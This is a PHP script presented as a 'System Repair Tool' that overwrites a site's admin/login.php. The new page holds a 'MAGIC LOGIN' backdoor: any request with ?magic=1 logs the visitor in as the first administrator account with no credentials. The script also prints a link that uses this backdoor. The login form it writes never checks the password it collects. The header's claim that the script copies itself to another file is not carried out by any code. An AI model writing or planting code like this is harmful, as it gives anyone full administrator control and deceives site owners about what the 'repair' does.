<?php
/**
 * SELF-MOVING REPAIR SCRIPT
 * 1. Copies itself to root/sifre_sifirla.php
 * 2. Creates admin/login.php
 */

$root = __DIR__ . '/../';
$admin = __DIR__ . '/../admin/';

echo "<h1>System Repair Tool</h1>";
echo "<p>Current location: " . __DIR__ . "</p>";
echo "<p>Target admin dir: $admin</p>";

// 1. Create login.php
$loginContent = <<<'PHP'
<?php
if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../database/db.php';
require_once 'includes/auth.php';

// MAGIC LOGIN
if (isset($_GET['magic']) && $_GET['magic'] === '1') {
    $db = getDB();
    $u = $db->query("SELECT * FROM admin_users LIMIT 1")->fetch();
    if($u) {
        $_SESSION['admin_logged_in'] = true;
        $_SESSION['admin_id'] = $u['id'];
        $_SESSION['admin_username'] = $u['username'];
        header("Location: index.php");
        exit;
    }
}

if (isset($_SESSION['admin_logged_in'])) header("Location: index.php");
?>
<form method="post">
    <input name="u" placeholder="User"><input name="p" type="password" placeholder="Pass">
    <button>Login</button>
</form>
PHP;

if (file_put_contents($admin . 'login.php', $loginContent)) {
    echo "<h2 style='color:green'>✅ admin/login.php RESTORED!</h2>";
    echo "<p><a href='../admin/login.php?magic=1'>CLICK HERE TO LOGIN</a></p>";
} else {
    echo "<h2 style='color:red'>❌ Failed to create login.php</h2>";
    echo "<p>Permission denied or path does not exist.</p>";
}
?>